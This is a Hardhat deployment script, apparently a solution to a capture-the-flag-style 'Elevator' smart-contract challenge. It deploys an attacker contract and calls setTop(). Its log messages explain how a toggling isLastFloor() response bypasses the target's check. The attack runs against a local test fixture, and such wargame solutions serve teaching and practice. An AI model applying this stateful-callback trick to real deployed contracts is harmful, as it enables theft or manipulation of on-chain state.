const { deployments, ethers } = require("hardhat")

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Attack deploying a new attacker contract */

  console.log("Deploying attacker contract...")
  console.log("Elevator setTop() function calls isLastFloor() twice on attacker contract")
  console.log("First call will switch toggle to false and return false to bypass the condition")
  console.log("Second call will switch toggle to true and return true to set the top to true")
  await deployments.fixture("elevator")
  const attacker = await ethers.getContract("ElevatorAttacker", deployer)

  /* Running the attack */

  console.log("Calling setTop() from attacker...")
  const setTopTx = await attacker.setTop(5)
  await setTopTx.wait(1)
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
